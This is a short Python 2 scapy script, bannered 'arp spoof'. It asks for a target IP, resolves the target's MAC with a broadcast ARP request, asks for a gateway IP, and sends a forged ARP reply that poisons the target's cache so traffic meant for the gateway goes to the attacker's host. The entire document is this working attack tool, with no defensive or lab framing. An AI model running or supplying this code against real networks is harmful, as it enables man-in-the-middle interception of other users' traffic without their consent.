from scapy.all import *
import scapy
x="***********************************************************************"
y="*******************************arp spoof*******************************"
z="***********************************************************************"
i=1
for i in range(1,2):
    print(x+"\n"+y+"\n"+z)
    print("Enter target ip address")
    ip=raw_input()
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=ip))
    for i,j in ans:
        mac=j[Ether].src
        print("************************************************************************\n          target ip :"+ip)
        print("\n          target mac:"+mac)
        print("************************************************************************\nEnter gateway ip address")
        gatip=raw_input()
        send(ARP(op=2,pdst=ip,hwdst=mac,psrc=gatip))
        while True:
            print("************************************************************************\nsuccessful!!!!!!!!!vamonos\n************************************************************************")
            break
        break